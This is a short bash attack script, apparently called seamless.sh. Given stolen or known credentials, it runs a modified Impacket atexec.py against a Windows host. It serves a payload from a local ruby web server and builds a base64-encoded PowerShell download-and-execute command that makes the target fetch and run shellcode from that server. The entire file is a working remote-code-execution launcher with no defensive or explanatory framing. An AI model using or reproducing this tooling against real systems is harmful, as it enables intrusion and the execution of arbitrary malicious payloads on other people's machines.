#!/bin/bash

ROOT=$(dirname "$0")

if [ $# -lt 2 ] ; then
    echo
    echo "Usage: seamless.sh <user>:<pass>@<host> [ <url> ]"
    echo
    echo "Example:"
    echo
    echo "  seamless.sh user:pass@192.168.2.34 http://192.168.2.91:8080/net.shellcode"
    echo
    echo "NOTE: the web server that delivers the payload listens on port 8080."
    echo "Without modifying the script, you might redirect whatever port you "
    echo "prefer to this one using something like socat."
    echo
    echo "This will only work if you have Impacket installed, as we use a modified"
    echo "version of atexec.py to achieve RCE."
    echo
    exit 1
fi

CREDS=$1
URL=$2

ruby -run -e httpd &
WEBSERVER=$!

while true; do
    echo "Waiting for web server to start..."
    curl -s $URL >/dev/null 2>/dev/null
    if [ "$?" -eq "0" ]; then
	echo "Server responded with payload, proceeding with launch"
	break
    fi
    sleep 1
done

sleep 2
code=$(m4 -DFILEURL=$URL < $ROOT/download-execute.ps1 | iconv -f ASCII -t UTF-16LE | base64 | tr -d '\n')

$ROOT/atexec.py ${CREDS} "c:/windows/system32/windowspowershell/v1.0/powershell -EncodedCommand ${code}"

sleep 10
kill $WEBSERVER
